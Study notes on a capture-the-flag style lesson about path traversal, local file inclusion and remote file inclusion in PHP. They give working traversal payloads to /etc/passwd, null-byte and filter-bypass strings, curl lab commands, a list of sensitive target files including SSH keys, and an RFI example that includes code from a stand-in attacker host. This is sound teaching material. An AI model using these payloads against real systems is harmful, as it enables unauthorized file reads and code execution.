## Task 1: Introduction 

**File Inclusion** is a web vulnerability where an attacker tricks a web application into loading a file that should not be accessible.

For example, imagine a website has: ``?page=home``

The application might internally do something like: ``load(page)``

If the application does not properly validate the input, an attacker may manipulate the parameter and make the application load a different file.



### What can happen?

A vulnerable application might allow an attacker to:

| **Impact**               | **Meaning**                                                     |
| ------------------------ | --------------------------------------------------------------- |
| **Read sensitive files** | Access files that should be private                             |
| **Expose configuration** | Find configuration or credential information                    |
| **Include local files**  | Load files from the server                                      |
| **Include remote files** | Load files from another server                                  |
| **Code execution**       | In some situations, included content can lead to code execution |



### Three Important Concepts
#### 1. Path Traversal
**Path Traversal** means escaping the directory that the application intended you to use.

Example: ``/var/www/pages/home.html``

The application expects files from: ``/var/www/pages/``

But an attacker manipulates the path so the application accesses something outside that directory.

> Path Traversal = move outside the allowed directory.


#### 2. Local File Inclusion — LFI

**LFI happens** when an application can be tricked into including a file that exists locally on the server.
````
Attacker
   |
   | malicious file/path input
   v
Web Application
   |
   v
Local file on server
````

> LFI = include a file from the target server.




#### 3. Remote File Inclusion — RFI

**RFI** happens when a vulnerable application is tricked into including a file from a remote location.
````
Attacker
   |
   | remote file
   v
Web Application
   |
   v
Remote server
````
Depending on the server configuration and application, this can potentially lead to Remote Code Execution (RCE).


> RFI = include a file from somewhere else.


### Learning Objectives

| **Objective**             | **What it means**                                             |
| ------------------------- | ------------------------------------------------------------- |
| Understand Path Traversal | Know how attackers escape an intended directory               |
| Understand LFI            | Know how local files can be included                          |
| Understand RFI            | Know how remote files can be included                         |
| Find entry points         | Identify parameters that control file loading                 |
| Exploit in a lab          | Safely test these vulnerabilities in the provided environment |
| Prevent File Inclusion    | Understand how developers can fix the problem                 |

## Task 3: Path Traversal


### How Web Applications Use Parameters to Access Files

Many web applications need to load files dynamically.

Consider this request:
````
http://webapp.thm/get.php?file=userCV.pdf
````
<img width="1200" height="800" alt="image" src="https://github.com/user-attachments/assets/1f44de3e-1e13-457e-8c7f-2d9ca32a1272" />

The URL contains a parameter:
````
file=userCV.pdf
````
| Part         | Meaning                 |
| ------------ | ----------------------- |
| `http://`    | Protocol                |
| `webapp.thm` | Domain name             |
| `/get.php`   | Web application/script  |
| `?`          | Starts the query string |
| `file`       | Parameter name          |
| `userCV.pdf` | Parameter value         |


The important part is:
````
file=userCV.pdf
````
The application takes the value of ``file`` and uses it to decide ``which file to read``.

<img width="1200" height="420" alt="image" src="https://github.com/user-attachments/assets/5f858b79-0188-455e-9b70-ed4d318d7123" />




### Why File Inclusion Vulnerabilities Happen

The problem occurs when the application trusts user input too much.

For example, a developer might write the following PHP code to load a requested page:
````
<?php
    $page = $_GET['page'];
    include($page);
?>
````


The developer expects something like:
````
?page=about.php
````
So the application loads:
````
about.php
````
But there is no validation preventing the user from supplying another path.

Conceptually: ``User input`` -> ``?page=about.php`` -> ``include($page)`` -> ``Server reads the requested file``


If the application accepts arbitrary paths, the user may be able to make the server access files that were never intended to be exposed.


> The vulnerability is not caused simply by ``include()`` or ``file_get_contents()``.


The real problem is: ``User-controlled input`` + ``Unsafe file access`` + ``Insufficient validation`` = ``File inclusion / Path Traversal vulnerability``




### What Is the Risk?

**risk of file inclusion vulnerabilities (LFI/RFI)** is that they can escalate from simple information disclosure to full server compromise:

- **Local File Inclusion (LFI)**: attacker can read sensitive files like ``/etc/passwd``, source code, or configuration files. If those files contain credentials, they may be reused to compromise other systems.
- **Poisoned files**: if logs or uploads contain injected code, including them can lead to remote code execution.
- **Remote File Inclusion (RFI)**: if external files are allowed, the attacker can host malicious code and force the server to execute it.
- **Worst case**: a single inclusion flaw can give the attacker complete control of the web server.



### Path Traversal


#### What Is Path Traversal?

**Path Traversal**, also called **Directory Traversal**, is a vulnerability that can allow an attacker to access files outside the application's intended directory.


Imagine the application is located here: ``/var/www/app/``

And it normally wants files from: ``/var/www/app/CVs/``

For example: ``/var/www/app/CVs/userCV.pdf``

The application might use code like:
````
<?php
    $file = $_GET['file'];

    echo file_get_contents('/var/www/app/CVs/' . $file);
?>
````
The developer expects: ``file=userCV.pdf``

So the resulting path becomes:
````
/var/www/app/CVs/userCV.pdf
````
That is normal behavior.

<img width="1200" height="482" alt="image" src="https://github.com/user-attachments/assets/b728e6d1-8e44-4e66-84aa-91a784bd9ded" />



#### The Dangerous Part: ../

<img width="1200" height="986" alt="image" src="https://github.com/user-attachments/assets/dff8ef1f-99f4-4589-a5f0-2637319408b2" />


The special sequence: ``../``

means:

> Go up one directory.

For example: ``/var/www/app/CVs/``

One level up: ``/var/www/app/``

Another: ``/var/www/``

Another: ``/var/``

Another: ``/``

So conceptually:
````
 /var/www/app/CVs/
        |
        | ../
        v
  /var/www/app/
        |
        | ../
        v
    /var/www/
        |
        | ../
        v
      /var/
        |
        | ../
        v
        /
````
Once the attacker reaches ``/``, they can navigate to another location.

For example, in a Linux lab: ``/etc/passwd``


#### How the Traversal Works

<img width="1200" height="600" alt="image" src="https://github.com/user-attachments/assets/26d59299-971a-4383-b5ff-58187da662ed" />

Suppose the application starts from: ``/var/www/app/CVs/``

A traversal path conceptually looks like: ``../../../../etc/passwd``

Break it down:
| Step                     | Current directory   |
| ------------------------ | ------------------- |
| Start                    | `/var/www/app/CVs/` |
| `../`                    | `/var/www/app/`     |
| `../../`                 | `/var/www/`         |
| `../../../`              | `/var/`             |
| `../../../../`           | `/`                 |
| `../../../../etc/passwd` | `/etc/passwd`       |


So instead of reading: ``/var/www/app/CVs/userCV.pdf``

the application may end up reading: ``/etc/passwd``

The important idea

Normal:
````
/var/www/app/CVs/userCV.pdf
             ^
             |
        intended file
````

Traversal:
````
/var/www/app/CVs/../../../../etc/passwd
             |
             +---- move outside the intended directory
````



#### Why file_get_contents() Can Be Dangerous

The PHP function: ``file_get_contents()``

reads the contents of a file.

For example:
````
file_get_contents('/var/www/app/CVs/' . $file);
````

If ``$file`` is trusted, this may be fine.

But if ``$file`` comes directly from the URL:
````
$file = $_GET['file'];
````
then the user controls part of the filesystem path.

The dangerous flow is: ``URL parameter`` -> ``$_GET['file']`` -> ``File path construction`` -> ``file_get_contents()`` -> ``Server reads file``

The application needs to properly restrict what ``$file`` is allowed to reference.


#### Om Linux

| Step                   | Explanation                                                                                               |
| ---------------------- | --------------------------------------------------------------------------------------------------------- |
| **URL**                | `http://webapp.thm/get.php?file=../../../../etc/passwd`                                                   |
| **Important section**  | `../../../../etc/passwd`                                                                                  |
| **Starting directory** | `/var/www/app/CVs/`                                                                                       |
| **`../`**              | Moves one directory level upward.                                                                         |
| **Multiple `../`**     | Repeatedly moves upward through the directory structure.                                                  |
| **`/`**                | Eventually reaches the filesystem root.                                                                   |
| **`etc/passwd`**       | Selects the `passwd` file inside `/etc/`.                                                                 |
| **Final path**         | `/etc/passwd`                                                                                             |
| **Result**             | If the application returns the file contents, an attacker may be able to read information from that file. |
| **Vulnerability**      | This is an example of **Path Traversal / Directory Traversal**.                                           |



#### Why /etc/passwd Is Commonly Used

On Linux, ``/etc/passwd`` contains information about local user accounts.

Example structure:
````
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
````
It does **not normally contain the users' plaintext passwords**.

However, it can reveal useful information such as:


| Information    | Example     |
| -------------- | ----------- |
| Username       | `root`      |
| UID            | `0`         |
| GID            | `0`         |
| Home directory | `/root`     |
| Login shell    | `/bin/bash` |



### Path Traversal on Windows

The same concept exists on Windows.

Instead of: ``/``

Windows commonly uses a drive such as: ``C:\``

For example, conceptually: ``C:\www\app\uploads\``

An attacker may attempt to traverse upward toward: ``C:\``

and then access another file.

The lesson gives examples such as: ``../../../../boot.ini``

or: ``../../../../windows/win.ini``

The exact path depends on the Windows system and application.

#### Linux vs Windows

| Linux           | Windows            |
| --------------- | ------------------ |
| `/`             | `C:\`              |
| `/etc/passwd`   | `C:\...`           |
| `/var/www/app/` | `C:\www\app\`      |
| `../`           | `..\`              |
| `/etc/`         | `C:\Windows\` etc. |

When testing for path traversal, it helps to know which files are worth going after. The table below lists some commonly targeted files on both `Linux` and ``Windows`` systems.
| File                          | System  | What it can contain                              |
| ----------------------------- | ------- | ------------------------------------------------ |
| `/etc/issue`                  | Linux   | System identification/login message              |
| `/etc/profile`                | Linux   | System-wide shell/environment configuration      |
| `/proc/version`               | Linux   | Linux kernel information                         |

| `/var/mail/root`              | Linux   | Root user's local mail, if present               |
| `/root/.ssh/id_rsa`           | Linux   | Potential private SSH key; normally restricted   |
| `/var/log/apache2/access.log` | Linux   | Apache HTTP access logs                          |
| `C:\boot.ini`                 | Windows | Boot configuration on systems that use it        |

## Task 4: Local File Inclusion - LFI

### Local File Inclusion (LFI)
**Local File Inclusion (LFI)** is closely related to Path Traversal, but there is an important difference.

With **Path Traversal**, an attacker manipulates a file path so the server reads an unintended file and returns its contents.

With LFI, the application passes the attacker-controlled file to a function such as PHP's ``include()``. The server processes the included file, which can make LFI more dangerous than simple file reading.

Common PHP functions associated with LFI are:
````
include()
require()
include_once()
require_once()
````

Flow: ``User input`` -> ``include()`` -> ``Local file`` -> ``Server processes the file``.



### Scenario 1: No Directory Specified

Suppose a web application lets users choose between an English and Arabic version of a page.

The developer uses a ``lang`` parameter:
````
<?php
    include($_GET["lang"]);
?>
````
The intended usage is:
````
http://webapp.thm/index.php?lang=EN.php
````
````
http://webapp.thm/index.php?lang=AR.php
````
The application expects: ``lang=EN.php`` -> ``$_GET["lang"]`` -> ``include("EN.php")`` -> ``EN.php is included``.

The problem is that **no directory is specified and there is no validation**.

The user controls the entire value passed to ``include()``.

For example:
````
http://webapp.thm/index.php?lang=/etc/passwd
````
The application effectively performs:
````
include("/etc/passwd");
````
The server therefore attempts to include the local file:

/etc/passwd

This works because the application has no restriction on what can be included.
> ``No directory restriction`` + ``User controls lang`` + ``include()`` = ``LFI``.



### Scenario 2: A Directory Is Specified in the Include

Now let's look at what happens when the developer tries to be more careful by specifying a directory.

The developer writes:
````
<?php
    include("languages/" . $_GET["lang"]);
?>
````
The intention is to restrict file loading to the: ``languages/``

directory.

A normal request might be: ``http://webapp.thm/index.php?lang=EN.php``

The application constructs: ``languages/EN.php``

So the flow is:
````
User
 |
 | EN.php
 v
languages/ + EN.php
 |
 v
languages/EN.php
````
This looks safer.

However, it is still vulnerable.

Why?
> Because the user's input is still directly concatenated into the path.



#### Using Path Traversal to Escape the Directory

The attacker can use: ``../``

The meaning of: ``../``

is:
> Go up one directory

Suppose the application is using: ``/var/www/app/languages/``

Then:
````
/var/www/app/languages/
             |
             | ../
             ↓
/var/www/app/
````

Another ``../``:
````
/var/www/app/
             |
             | ../
             ↓
/var/www/
````


Another:
````
/var/www/
        |
        | ../
        ↓
/var/
````

Another:
````
/var/
   |
   | ../
   ↓
/
````
Once the attacker reaches ``/``, they can navigate to another file.

For example: ``/etc/passwd``


#### How the Final Path Is Created

The application uses: ``include("languages/" . $_GET["lang"]);``

The important part is: ``languages/`` + ``USER INPUT``

If the input contains traversal sequences, the resulting path can escape the intended directory.

Conceptually: ``languages/../../../etc/passwd``

The operating system resolves the ``../`` sequences: ``languages/`` -> ``../`` -> ``parent directory`` -> ``../`` -> ``parent directory`` -> ``../`` -> ``/`` -> ``etc/passwd``

The final location can become: ``/etc/passwd``

The important difference from simple Path Traversal is that ``include()`` is being used, so the application processes the included file rather than simply treating it as an ordinary file read.

## Task 5: Local File Inclusion - (LFI) Continued

### Scenario 3: Black-Box Testing and Appended Extensions

> The website adds ``.php`` to whatever we give it.

#### We start with this URL
````
http://webapp.thm/index.php?lang=EN
````

We give the website: ``EN``

We don't know what the website does with it because we **cannot see the source code**.

This is called: ``Black-box testing``

It simply means: ``We test the application without seeing its source code``.

If we enter something invalid like THM, the server returns an error:
````
Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
````


#### The error gives us 2 important clues

We send:
````
http://webapp.thm/index.php?lang=THM
````
The server shows: ``include(languages/THM.php)``

We entered: ``THM``

But the application changed it to: ``languages/THM.php``

So we learn: ``Our input`` -> ``THM`` -> ``languages/ + THM + .php`` -> ``languages/THM.php``

Therefore, the application is probably doing: ``include("languages/" . $_GET["lang"] . ".php");``


Knowing the full path tells us exactly how many ``../`` sequences we need. Since the application sits four levels deep (``/var/www/html/THM-4/``), we try:
````
http://webapp.thm/index.php?lang=../../../../etc/passwd
````
But we still get an error:
````
Warning: include(languages/../../../../../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12
````


When a vulnerable application appends ``.php`` to every file we try to include, attackers sometimes attempt a null byte injection (``%00``) to terminate the string early.
- **File inclusion vulnerability**: lets attackers read or execute files.
- **Problem**: server forces ``.php`` extension, so ``/etc/passwd`` becomes ``/etc/passwd.php``.
- **Bypass idea**: inserting a null byte (``%00``) tricks older interpreters into stopping at ``/etc/passwd``, ignoring the .php.


> **Important**: Important: The null byte trick was patched in ``PHP 5.3.4`` and above. We won't find it on modern PHP installations, but it still appears in older legacy applications.



### Scenario 4: Keyword Filtering with Path Bypass

The application wants to block this file: ``/etc/passwd``


The filter blocks it: ``/etc/passwd`` -> ``Filter`` -> ``BLOCK``

The developer checks whether the input contains the blocked path.

Add ``/.``

Instead of: ``/etc/passwd``

we use: ``/etc/passwd/.``

The filter may not recognise it as the exact blocked string because there are extra characters:
````
/etc/passwd/.
           ^^
````
But ``.`` means: ``. = current directory``

So the filesystem can normalize the path back to the target.


Null byte method

The lesson also shows the old technique: ``/etc/passwd%00``

``%00`` is a null byte.

In old vulnerable applications, it could cause processing to stop at ``%00``, preventing extra characters such as ``.php`` from being used.


Lab commands
````
curl "http://webapp.thm/index.php?lang=/etc/passwd%00"
````
or:
````
curl "http://webapp.thm/index.php?lang=/etc/passwd/."
````

Remember
- **Filter** → checks the text
- **Filesystem** → resolves the path



### Scenario 5: Stripping ../ from Input

This scenario is about a **filter that removes** ``../`` from our input.

Normal traversal

We try:
````
http://webapp.thm/index.php?lang=../../../etc/passwd
````
But the filter removes every ``../``.

So: ``../../../etc/passwd`` -> ``FILTER`` -> ``etc/passwd``

The traversal doesn't work.



The filter has a weakness

The important detail is:

> The filter only checks the input once.

We can use a doubled traversal pattern.

For example: ``....//....//....//etc/passwd``

The filter finds the inner: ``../``

and removes it.

After removal, another: ``../``

is left behind.

Conceptually:
````
....// 
  ↓ remove ../
../
````

So after filtering, a valid traversal sequence remains.


Why does it work?

The filter does: ``INPUT`` -> ``Remove ../`` -> ``STOP``

It doesn't scan the result again.

Therefore:
````
Before filtering:
....//....//....//etc/passwd

        ↓

After filtering:
../../../etc/passwd
````
<img width="1200" height="370" alt="image" src="https://github.com/user-attachments/assets/5ff54373-464e-4755-ad64-adce5de79ca6" />


The remaining ``../`` can then be interpreted by the filesystem.

Lab example

The lesson uses a payload similar to: ``....//....//....//....//....//etc/passwd``

The important pattern is: ``....//``

because it can leave: ``../``

after the filter removes the inner sequence.



### Scenario 6: Forced Directory Prefix

This scenario is about an application that **forces your input to start with a specific directory**.


The application expects: ``languages/EN.php``

So it expects: ``languages/``

at the beginning.

If we don't provide it: ``THM``

the application rejects the request.


The weakness

We can put the required directory at the beginning: ``languages/../../../../etc/passwd``

Now the application sees: ``languages/``

at the start, so it allows the input.

Then: ``../``

means:
> Go up one directory

So conceptually: ``languages/`` -> ``../`` -> ``go up`` -> ``../`` -> ``go up`` -> ``...`` -> ``/etc/passwd``


The important idea

The developer thinks: ``"Input starts with languages/, so it's safe."``

But that's not enough.

The attacker can do: ``languages/ + ../ + ../ + ... + target``

So the prefix check is bypassed.


Lab example

The screenshot uses: ``http://webapp.thm/index.php?lang=languages/../../../../etc/passwd``

For the lab, the target mentioned is: ``/etc/os-release``

So the key thing to figure out is: ``What directory must appear at the beginning?`` -> ``Put that directory first`` -> ``Use ../ to leave it`` -> ``Reach the target file``

## Task 6: Remote File Inclusion (RFI)

**RFI** is a vulnerability where a web application uses a file from another server.

> **LFI** → file already exists on target server
> 
> **RFI** → file is hosted on another server



### Requirements for RFI

RFI generally requires PHP settings that allow remote URLs to be used with file-inclusion functions.

Important settings:
````
allow_url_fopen
allow_url_include
````
If these are enabled, functions such as:
````
include()
require()
````
may be able to process a remote URL.


### How RFI Works
<img width="1200" height="720" alt="image" src="https://github.com/user-attachments/assets/a63ddd4a-7a43-48df-8c09-b710661b2528" />


#### 1. Attacker creates a file

The attacker hosts:
````
http://attacker.thm/cmd.txt
````
Example: ``<?php echo "Hello THM"; ?>``


#### 2. Attacker sends the URL

The vulnerable application has:
````
include($_GET["lang"]);
````
The attacker supplies:
````
http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt
````

#### 3. Server fetches the file

``Attacker Server`` -> ``cmd.txt`` -> ``Target Server``


#### 4. include() processes it

The target application receives the remote file and processes it through PHP.


### Consequences of RFI

A successful RFI can potentially cause:
- **Remote Code Execution (RCE)**
- **Sensitive information disclosure**
- **Cross-Site Scripting (XSS)**
- **Denial of Service (DoS)**

The most serious outcome is usually: ``RFI`` -> ``Remote file included`` -> ``Code executed`` -> ``RCE``.

### A Methodology for Testing File Inclusion
| # | Step                              | What to Do                                         | What to Look For                                                  |
| - | --------------------------------- | -------------------------------------------------- | ----------------------------------------------------------------- |
| 1 | **Identify Entry Points**         | Find parameters that control which file is loaded. | `file=`, `page=`, `lang=`, POST data, cookies, headers            |
| 2 | **Observe Normal Behaviour**      | Send a normal/valid value first.                   | Normal response and expected file                                 |
| 3 | **Submit Unexpected Input**       | Try invalid filenames and path values.             | Errors, unexpected responses, file contents                       |
| 4 | **Don't Trust the Browser Alone** | Use Burp Suite to inspect/modify requests.         | GET, POST, cookies, headers, exact parameters                     |
| 5 | **Pay Attention to Errors**       | Read error messages carefully.                     | Application path, `include()`, prefixes, extensions               |
| 6 | **Identify Filters & Validation** | Determine how the application changes your input.  | `../` removed, directory added, extension added, keywords blocked |
| 7 | **Craft Your Payload**            | Build a test input based on what you discovered.   | Input reaches the intended file                                   |
